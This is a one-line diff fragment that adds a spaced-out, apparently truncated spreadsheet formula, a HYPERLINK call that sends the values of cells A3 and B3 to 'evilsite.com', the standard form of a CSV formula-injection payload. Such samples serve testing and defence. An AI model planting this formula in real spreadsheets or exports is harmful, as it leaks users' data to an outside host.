@@ -1,0 +1,1 @@
+1 = HYPERLINK ( " http :// evilsite . com ? x = " & A3 & " ," & B3 & " [ CR ] " ,
